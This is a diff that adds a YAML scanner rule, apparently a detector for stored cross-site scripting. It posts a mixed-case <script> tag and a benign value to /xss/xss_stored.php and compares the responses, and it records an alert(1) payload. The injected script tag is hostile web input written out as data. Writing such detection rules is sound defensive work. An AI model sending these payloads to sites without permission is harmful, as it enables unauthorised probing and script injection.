@@ -1,0 +1,16 @@
+name: xss_stored
+rules:
+  - method: POST
+    path: /xss/xss_stored.php
+    follow_redirects: false
+    body: message=%3CScRiPt%3Exsxxztadvg%3C%2FsCrIpT%3E&submit=submit
+    expression: response.status==200 && lengthDiff
+  - method: POST
+    path: /xss/xss_stored.php
+    follow_redirects: false
+    body: message=1&submit=submit
+    expression: response.status==200 && lengthDiff
+detail:
+  type: xss
+  paramkey: message
+  payload: <sCrIpT>alert(1)</sCrIpT>
